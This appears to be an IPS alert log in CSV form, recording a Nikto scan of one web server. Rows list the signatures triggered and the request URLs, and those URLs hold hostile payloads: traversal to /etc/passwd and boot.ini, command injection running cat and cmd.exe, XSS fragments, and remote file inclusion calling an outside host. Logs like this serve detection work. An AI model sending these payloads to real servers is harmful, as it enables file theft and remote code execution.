attackid,sessionid,repeated,severity,attack,service,srcip,dstip,srcport,dstport,subtype,eventtype,url
44780,7236,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50986,80,ips,signature,/forum_arc.asp?n=/../../../../../../../../../../../../../../../../../../../../boot.ini|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
43336,7237,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50988,80,ips,signature,/forum_arc.asp?n=/../../../../../../../../etc/passwd|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7238,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50990,80,ips,signature,/forum_arc.asp?n=/.\\\
43336,7239,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50992,80,ips,signature,/forum_arc.asp?n=/etc/passwd%00|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
43336,7240,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50994,80,ips,signature,/forum_arc.asp?n=/etc/passwd|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7241,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50996,80,ips,signature,/forum_arc.asp?n=268
44780,7241,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,50996,80,ips,signature,
43336,7242,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,50998,80,ips,signature,/forum_professionnel.asp?n=%60/etc/passwd%60|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;`&#039;.
44780,7243,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51000,80,ips,signature,/forum_professionnel.asp?n=....//....//....//....//....//....//....//etc.passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
43336,7244,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51002,80,ips,signature,/forum_professionnel.asp?n=../../../../../../../../../etc/passwd%00|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7245,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51004,80,ips,signature,/forum_professionnel.asp?n=/....../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7246,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51006,80,ips,signature,/forum_professionnel.asp?n=/.../.../.../.../.../.../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7247,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51008,80,ips,signature,/forum_professionnel.asp?n=/../../../../../../../../../../../../../../../../../../../../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
43336,7248,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51010,80,ips,signature,/forum_professionnel.asp?n=/../../../../../../../../etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7249,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51012,80,ips,signature,/forum_professionnel.asp?n=/.\\\
43336,7250,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51014,80,ips,signature,/forum_professionnel.asp?n=/etc/passwd%00|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
43336,7251,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51016,80,ips,signature,/forum_professionnel.asp?n=/etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7252,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51018,80,ips,signature,/forum_professionnel.asp?n=100
44780,7252,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51018,80,ips,signature,
44780,7253,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51020,80,ips,signature,/functions.inc.php+
43336,7253,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51020,80,ips,signature,/imprimer.asp?no=%60/etc/passwd%60|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;`&#039;.
44780,7253,9,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51020,80,ips,signature,
44780,7254,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51022,80,ips,signature,/imprimer.asp?no=....//....//....//....//....//....//....//etc.passwd|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
43336,7255,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51024,80,ips,signature,/imprimer.asp?no=../../../../../../../../../etc/passwd%00|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7256,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51026,80,ips,signature,/imprimer.asp?no=/....../boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7257,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51028,80,ips,signature,/imprimer.asp?no=/.../.../.../.../.../.../boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7258,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51030,80,ips,signature,/imprimer.asp?no=/../../../../../../../../../../../../../../../../../../../../boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
43336,7259,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51032,80,ips,signature,/imprimer.asp?no=/../../../../../../../../etc/passwd|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7260,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51034,80,ips,signature,/imprimer.asp?no=/.\\\
43336,7261,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51036,80,ips,signature,/imprimer.asp?no=/etc/passwd%00|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
43336,7262,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51038,80,ips,signature,/imprimer.asp?no=/etc/passwd|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7263,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51040,80,ips,signature,/imprimer.asp?no=c:\\boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;c:&#039;.
44780,7264,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51042,80,ips,signature,/include/customize.php
43336,7264,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51042,80,ips,signature,/mailview.cgi?cmd=view&amp;fldrname=inbox&amp;select=1&amp;html=../../../../../../etc/passwd
24975,7264,1,medium,HTTP.Malformed.Request.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,51042,80,ips,signature,/modif_infos.asp?n=/....../boot.ini
30908,7264,1,medium,Oxide.WebServer.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,51042,80,ips,signature,/modif_infos.asp?n=/.../.../.../.../.../.../boot.ini
44780,7264,67,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51042,80,ips,signature,
43336,7264,5,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51042,80,ips,signature,
30908,7264,1,medium,Oxide.WebServer.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,51042,80,ips,signature,
44780,7265,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51044,80,ips,signature,/protection.php
43336,7265,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51044,80,ips,signature,/rubrique.asp?no=%60/etc/passwd%60|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;`&#039;.
44780,7265,5,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51044,80,ips,signature,
44780,7266,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51046,80,ips,signature,/rubrique.asp?no=....//....//....//....//....//....//....//etc.passwd|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
43336,7267,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51048,80,ips,signature,/rubrique.asp?no=../../../../../../../../../etc/passwd%00|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7268,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51050,80,ips,signature,/rubrique.asp?no=/....../boot.ini|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7269,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51052,80,ips,signature,/rubrique.asp?no=/.../.../.../.../.../.../boot.ini|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7270,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51054,80,ips,signature,/rubrique.asp?no=/../../../../../../../../../../../../../../../../../../../../boot.ini|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
43336,7271,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51056,80,ips,signature,/rubrique.asp?no=/../../../../../../etc/passwd|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
43336,7272,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51058,80,ips,signature,/rubrique.asp?no=/../../../etc/passwd|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7273,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51060,80,ips,signature,/rubrique.asp?no=/.\\\
43336,7274,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51062,80,ips,signature,/rubrique.asp?no=/etc/passwd%00|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
43336,7275,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51064,80,ips,signature,/rubrique.asp?no=/etc/passwd|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
44780,7276,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51066,80,ips,signature,/rubrique.asp?no=c:\\boot.ini|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;c:&#039;.
44780,7277,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51068,80,ips,signature,/screen.php
43336,7277,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51068,80,ips,signature,/shoutbox/expanded.php?conf=../../../../../../../etc/passwd%20
12648,7277,1,medium,HTPasswd.Access,HTTP,172.16.1.2,172.16.2.2,51068,80,ips,signature,/.htpasswd
44780,7277,76,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51068,80,ips,signature,
43336,7277,2,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51068,80,ips,signature,
43336,7278,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51070,80,ips,signature,////////../../../../../../etc/passwd
44780,7279,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51072,80,ips,signature,/_vti_bin/shtml.exe/_vti_rpc
12979,7279,1,medium,Administrators.PWD,HTTP,172.16.1.2,172.16.2.2,51072,80,ips,signature,/_vti_pvt/administrators.pwd
44780,7279,97,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51072,80,ips,signature,
12979,7279,2,medium,Administrators.PWD,HTTP,172.16.1.2,172.16.2.2,51072,80,ips,signature,
44780,7280,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51074,80,ips,signature,/examples/forward1
44780,7280,100,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51074,80,ips,signature,
44780,7281,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51076,80,ips,signature,/index.html.ru.cp866
44780,7281,28,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51076,80,ips,signature,
44780,7282,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51078,80,ips,signature,/icons/
43336,7282,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51078,80,ips,signature,/mylog.html?screen=/etc/passwd
44780,7282,53,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51078,80,ips,signature,
43336,7282,4,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51078,80,ips,signature,
44780,7283,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51080,80,ips,signature,/cfide/administrator/index.cfm
43336,7283,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51080,80,ips,signature,/directory.php?dir=%3Bcat%20/etc/passwd
34971,7283,1,medium,NetworkActiv.Web.Server.XSS,HTTP,172.16.1.2,172.16.2.2,51080,80,ips,signature,/webcalendar/week.php?user=\\\
44780,7283,86,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51080,80,ips,signature,
43336,7283,12,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51080,80,ips,signature,
44780,7284,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51082,80,ips,signature,/acart2_0/error.asp?msg=<script>alert(\\\
12015,7284,1,high,MS.IIS.Web.Server.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,51082,80,ips,signature,/certsrv/..%c0%af../winnt/system32/cmd.exe?/c+dir
50825,7284,1,high,Apache.HTTP.Server.cgi-bin.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51082,80,ips,signature,/cgi-bin/..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir
43336,7284,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51082,80,ips,signature,/shoutbox.php?conf=../../../../../../../etc/passwd
24975,7284,1,medium,HTTP.Malformed.Request.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,51082,80,ips,signature,/.%252e/.%252e/.%252e/winnt/boot.ini
44780,7284,78,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51082,80,ips,signature,
12015,7284,13,high,MS.IIS.Web.Server.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,51082,80,ips,signature,
50825,7284,1,high,Apache.HTTP.Server.cgi-bin.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51082,80,ips,signature,
43336,7284,4,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51082,80,ips,signature,
12015,7285,1,high,MS.IIS.Web.Server.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+ver
44780,7285,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,/server-info
50825,7285,1,high,Apache.HTTP.Server.cgi-bin.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%49%4E%4E%54%2F%73%79%73%74%65%6D%33%32%2Fping.exe%20127.0.0.1
24975,7285,1,medium,HTTP.Malformed.Request.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cboot.ini
43336,7285,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,/gallery/index.php?include=../../../../../../../../../etc/passwd
12980,7285,1,high,ANS.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,/ans.pl?p=../../../../../usr/bin/id|&blah
10003,7285,1,medium,MS.IIS.Web.Application.SourceCode.Disclosure,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,/iissamples/sdk/asp/docs/CodeBrws.asp?Source=/IISSAMPLES/%c0%ae%c0%ae/%c0%ae%c0%ae/bogus_directory/nonexistent.asp
12015,7285,1,high,MS.IIS.Web.Server.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,
44780,7285,78,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,
50825,7285,1,high,Apache.HTTP.Server.cgi-bin.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,
43336,7285,2,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,
12980,7285,1,high,ANS.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,
10003,7285,1,medium,MS.IIS.Web.Application.SourceCode.Disclosure,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,
44780,7286,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51086,80,ips,signature,/bmp/mime.types
34971,7286,1,medium,NetworkActiv.Web.Server.XSS,HTTP,172.16.1.2,172.16.2.2,51086,80,ips,signature,/rpc.php?q=\\\
44780,7286,99,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51086,80,ips,signature,
44780,7287,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51088,80,ips,signature,/doc/Judy/
44780,7287,100,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51088,80,ips,signature,
44780,7288,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51090,80,ips,signature,/Host/Portals/tabid/19/ctl/Login/portalid/0/Default.aspx
44780,7288,100,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51090,80,ips,signature,
44780,7289,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51092,80,ips,signature,/va/
44780,7289,100,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51092,80,ips,signature,
44780,7290,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51094,80,ips,signature,/sc/
44780,7290,100,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51094,80,ips,signature,
44780,7291,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51096,80,ips,signature,/BetaBlockModules/GroupForumPermalinkModule/GroupForumPermalinkModule.php?path_prefix=http://cirt.net/rfiinc.txt?
48010,7291,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51096,80,ips,signature,/Jobline/admin.jobline.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
15117,7291,1,medium,NuclearBB.Root.Path.Parameter.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51096,80,ips,signature,/NuclearBB/tasks/send_queued_emails.php?root_path=http://cirt.net/rfiinc.txt?
44780,7291,97,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51096,80,ips,signature,
15117,7291,1,medium,NuclearBB.Root.Path.Parameter.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51096,80,ips,signature,
44780,7292,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51098,80,ips,signature,/OpenSiteAdmin/scripts/classes/FieldManager.php?path=http://cirt.net/rfiinc.txt?%00
29613,7292,1,high,SQuery.LibPath.Parameter.Multiple.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51098,80,ips,signature,/SQuery/lib/gore.php?libpath=http://cirt.net/rfiinc.txt?
44780,7292,18,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51098,80,ips,signature,
44780,7293,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51100,80,ips,signature,/ScriptPath/footers.php?tinybb_footers=http://cirt.net/rfiinc.txt?
14946,7293,1,low,Flip.Previewtheme.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51100,80,ips,signature,/[path]/previewtheme.php?theme=1&inc_path=http://cirt.net/rfiinc.txt??cmd
15091,7293,1,high,Ajax.File.Browser.approot.Parameter.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51100,80,ips,signature,/_includes/settings.inc.php?approot=http://cirt.net/rfiinc.txt?
14950,7293,1,low,NcasterCMS.Archive.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51100,80,ips,signature,/admin/addons/archive/archive.php?adminfolder=http://cirt.net/rfiinc.txt?
14857,7293,1,high,RipeCMS.Parameter.Level.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51100,80,ips,signature,/admin/includes/admin_header.php?level=http://cirt.net/rfiinc.txt?
44780,7293,93,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51100,80,ips,signature,
14857,7293,3,high,RipeCMS.Parameter.Level.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51100,80,ips,signature,
44780,7294,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51102,80,ips,signature,/admin/includes/spaw/spaw_control.class.php?spaw_root=http://cirt.net/rfiinc.txt??
14956,7294,1,high,Somery.Include.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51102,80,ips,signature,/admin/system/include.php?skindir=http://cirt.net/rfiinc.txt?
48010,7294,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51102,80,ips,signature,/administrator/components/com_bayesiannaivefilter/lang.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
13825,7294,1,low,Joomla!.com_webring.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51102,80,ips,signature,/administrator/components/com_webring/admin.webring.docs.php?component_dir=http://cirt.net/rfiinc.txt??
44780,7294,48,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51102,80,ips,signature,
14956,7294,1,high,Somery.Include.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51102,80,ips,signature,
48010,7294,48,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51102,80,ips,signature,
44780,7295,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51104,80,ips,signature,/administrator/menu_add.php?site_absolute_path=http://cirt.net/rfiinc.txt??
15091,7295,1,high,Ajax.File.Browser.approot.Parameter.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51104,80,ips,signature,/afb-3-beta-2007-08-28/_includes/settings.inc.php?approot=http://cirt.net/rfiinc.txt?
48010,7295,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51104,80,ips,signature,/akocomments.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
44780,7295,97,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51104,80,ips,signature,
15091,7295,1,high,Ajax.File.Browser.approot.Parameter.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51104,80,ips,signature,
44780,7296,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51106,80,ips,signature,/block.php?Include=http://cirt.net/rfiinc.txt?
48010,7296,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51106,80,ips,signature,/catalogshop.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
44780,7296,99,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51106,80,ips,signature,
44780,7297,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51108,80,ips,signature,/classes/html/com_articles.php?absolute_path=http://cirt.net/rfiinc.txt?
48010,7297,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51108,80,ips,signature,/com_booklibrary/toolbar_ext.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt??
44780,7297,68,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51108,80,ips,signature,
48010,7297,31,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51108,80,ips,signature,
48010,7298,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51110,80,ips,signature,/components/com_thopper/inc/timelog_type.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
44780,7298,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51110,80,ips,signature,/components/core/connect.php?language_path=http://cirt.net/rfiinc.txt?
14947,7298,1,low,FrontAccounting.Config.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51110,80,ips,signature,/config.php?path_to_root=http://cirt.net/rfiinc.txt?
48010,7298,2,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51110,80,ips,signature,
44780,7298,17,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51110,80,ips,signature,
44780,7299,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51112,80,ips,signature,/config.php?returnpath=http://cirt.net/rfiinc.txt?
